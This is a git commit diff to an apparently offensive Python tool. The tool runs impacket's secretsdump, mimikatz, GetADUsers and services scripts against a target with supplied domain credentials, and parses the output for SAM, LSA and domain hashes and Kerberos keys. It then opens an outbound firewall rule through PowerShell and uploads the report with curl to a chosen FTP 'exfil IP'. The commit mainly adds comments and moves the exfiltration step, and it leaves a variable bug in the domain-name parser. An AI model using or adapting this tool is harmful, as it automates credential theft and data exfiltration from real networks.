a91beed78a78a4e137bc01b035c8dc11d14428e7
Keiran <keiranosullivan1712@gmail.com>
2024-04-21 16:11:44 +0100

    Key adjustments and comments

--- main.py
+++ main.py
@@ -7,9 +7,9 @@ import re
 parser = argparse.ArgumentParser("", formatter_class=argparse.RawTextHelpFormatter)
 req_args = parser.add_argument_group('required arguments')
 
-req_args.add_argument('-d', '--domain', help='The domain')#, required=True)
-req_args.add_argument('-u', '--username', help='The username')#, required=True)
-req_args.add_argument('-p', '--password', help='The password')#, required=True)
+req_args.add_argument('-d', '--domain', help='The domain', required=True)
+req_args.add_argument('-u', '--username', help='The username', required=True)
+req_args.add_argument('-p', '--password', help='The password', required=True)
 
 args = parser.parse_args()
 
@@ -19,30 +19,31 @@ username = args.username
 password = args.password
 validExfilIP = False
 validTargetIP = False
+targetIP = None
 secretsdump_path = './impacket/examples/secretsdump.py'
 mimikatz_path = './impacket/examples/mimikatz.py'
 services_path = './impacket/examples/services.py'
 getADUsers_path = './impacket/examples/getADUsers.py'
 dumpNTMLInfo_path = './impacket/examples/DumpNTLMInfo.py'
 
-# Getting the AD Users requires the full DNS domain name for some reason... so we will get it here.
+# Getting the AD Users requires the full DNS domain name, we can get this out of the NTLM dump.
 def get_domain_name(filepath):
-    domain_name = ""
+    full_domain_name = ""
     try:
         with open(filepath, 'r') as f:
             for line in f:
                 if "DNS Domain Name" in line:
-                    extra, domain_name = line.split(':', 1)
-                    domain_name = domain_name.strip()
+                    extra, full_domain_name = line.split(':', 1)
+                    full_domain_name = domain_name.strip()
                     break
     except FileNotFoundError:
         print("NTML Output file not found.")
     except Exception as e:
         print(f"An error occurred: {e}")
-    return domain_name
+    return full_domain_name
 
 # Read mimikatz output and find where there are RID and User lines, if there are both then there is a chance the following
-# Line will be an NTLM Hash.
+# Line will be an NTLM Hash, even without the NTLM hash, this still indicates what users are on the machine.
 
 def get_NTML_hash(filepath):
     try:
@@ -55,6 +56,10 @@ def get_NTML_hash(filepath):
                     of.write(line.strip() + '\n\n')
     except Exception as e:
         print(f"An error occurred extracting the NTLM info: {e}")
+
+# The following function will process the output of the secretsdump script, this file can vary from machine to machine.
+# We use start and end flags that are consistent in the output. If they don't appear then we do not include the flag
+# in the output.
 
 def process_secrets_dump(filepath):
     start_sam = "[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)"
@@ -83,9 +88,12 @@ def process_secrets_dump(filepath):
             # Check for start and end of SAM segment
             if line.strip() == start_sam:
                 sam_flag = True # change the flag to true
-                continue # skips the header
+                continue # skips the header line.
             elif line.strip() == end_sam:
                 sam_flag = False
+
+            # If the flag is true, we append the lines to the array until the end flag is found,
+            # When the end flag is found it sets type flag to False, this will stop appending to the array.
 
             # Check for start and end of LSA segment
             if line.strip() == start_lsa:
@@ -116,6 +124,9 @@ def process_secrets_dump(filepath):
                 domain_hashes.append(line.strip())
             elif kerberos_flag:
                 kerberos_info.append(line.strip())
+
+    # We open the output file as write, as this is the first entry to final output report text file.
+    # If the hashes array has an entry in it, we write the header then the contents of the array.
     try:
         with open('./output.txt', 'w') as of:
             if sam_hashes:
@@ -135,9 +146,14 @@ def process_secrets_dump(filepath):
             for key in kerberos_info:
                 of.write(f"{key}\n")
             of.write(f"\n")
+    # Handle any errors and output this, so the user knows.
     except Exception as e:
         print(f"Error: {e}")
 
+# Interpret the AD users output file. We use regex here to get the start of the file.
+# After this, we get all parts of the line into the array by using .split(), this will create entry depending on
+# Whitespace. The script then opens output.txt in append and writes the username and email address.
+# This function wouldn't be able to detect if a username has a space in it however, this should be addressed in future.
 def get_ad_users(filepath):
     pattern = r"(-+(\s+-+)+)"
     all_info = []
@@ -154,10 +170,14 @@ def get_ad_users(filepath):
         for info in all_info:
             of.write(f"User:\n")
             of.write(f"{info[0]}\n")
-            if "@" in info[1]:
-                of.write(f"   {info[0]}'s email: {info[1]}\n")
-            else:
-                continue
+            for item in info:
+                if "@" in item:
+                    of.write(f"   {info[0]}'s email: {item}\n")
+                    break
+
+# This function interprets the output of the services script. We only append services that are running to
+# the services array. Additionally, before this is appended to the output file we remove most of the whitespaces
+# to help readability in the final file.
 
 def get_services(filepath):
     start_string = "[*] Listing services available on target"
@@ -179,15 +199,15 @@ def get_services(filepath):
             of.write(f"{service}\n")
         of.write("\n")
 
-
 # Get the IP of the target machine.
-while validTargetIP is False:
+while not validTargetIP:
     targetIP = input("Enter the IP of the target system\n")
+    # See if the IP is in a valid format.
     try:
         socket.inet_aton(targetIP)
         validTargetIP = True
     except socket.error:
-        targetIP = input("The target IP you entered is not valid, please try again.\n")
+        print("The target IP you entered is not valid, please try again.\n")
 
 
 # Find out if the report should be exfiltrated
@@ -201,19 +221,6 @@ if exfilBool.lower() == "y":
 else:
     exfilBool = False
 
-if exfilBool is True:
-    while validExfilIP is False:
-        # Check the Exfil IP address is in a valid format.
-        exfilIP = input("Enter the IP you wish to exfiltrate the report to.\n")
-        try:
-            socket.inet_aton(exfilIP)
-            validExfilIP = True
-        except socket.error:
-            exfilBool = input("The IP address entered was not valid, please try again.\n")
-    # Add outbound firewall rule for FTP
-    os.system("powershell New-NetFirewallRule -DisplayName 'FTP-Outbound' -Profile @('Domain', 'Private', 'Public')"
-              " -Direction Outbound -Action Allow -Protocol TCP -LocalPort @(21)")
-
 # Run the secretsdump script, saves to file
 secCommand = f"py {secretsdump_path} {domain}/{username}:{password}@{targetIP} > .\\secOutput.txt"
 
@@ -222,13 +229,15 @@ os.system(secCommand)
 # Use the process function and see if it works to filter out useless info. Needs input path
 process_secrets_dump("./secOutput.txt")
 
-# Dump the NTLM Info
+# Dump the NTLM Info and filter the output.
 dumpNTLMCommand = f"py {dumpNTMLInfo_path} {targetIP} > .\\NTLMInfo.txt"
 os.system(dumpNTLMCommand)
 
+# Assign the domain name to a variable for later use.
 domain_name = get_domain_name("./NTLMInfo.txt")
 
-# Run the mimikatz script, this uses command.txt which elevates the token and does a lsadump.
+# Run the mimikatz script, this uses command.txt which elevates the token and does a lsadump
+# and call the function to filter the output
 mimiCommand = f"py {mimikatz_path} -f ./command.txt "\
               f"{domain}/{username}:{password}@{targetIP} > .\\mimiOutput.txt"
 os.system(mimiCommand)
@@ -236,7 +245,7 @@ os.system(mimiCommand)
 # Extract key info to output text file.
 get_NTML_hash(".\\mimiOutput.txt")
 
-# Run ADUsers script.
+# Run ADUsers script and filter the output
 ADUsersCommand = (f"py {getADUsers_path} -all -dc-ip {targetIP} {domain_name}/{username}:{password}"
                   f" > .\\ADUsersOutput.txt")
 os.system(ADUsersCommand)
@@ -248,4 +257,16 @@ servicesCommand = f"py {services_path} {domain}/{username}:{password}@{targetIP}
 os.system(servicesCommand)
 get_services(".\\servicesOutput.txt")
 
-os.system(f"curl -T output.txt ftp://{exfilIP}/ --user upload:''")
+# Upload the final output file to the exfil IP.
+while exfilBool and not validExfilIP:
+    # Get the exfil IP and check if it is in a valid format.
+    exfilIP = input("Enter the IP you wish to exfiltrate the report to.\n")
+    try:
+        socket.inet_aton(exfilIP)
+        validExfilIP = True
+    except socket.error:
+        print("The IP address entered was not valid, please try again.\n")
+    # Add outbound firewall rule for FTP and upload the final report file.
+    os.system("powershell New-NetFirewallRule -DisplayName 'FTP-Outbound' -Profile @('Domain', 'Private', 'Public')"
+              " -Direction Outbound -Action Allow -Protocol TCP -LocalPort @(21)")
+    os.system(f"curl -T output.txt ftp://{exfilIP}/ --user upload:''")
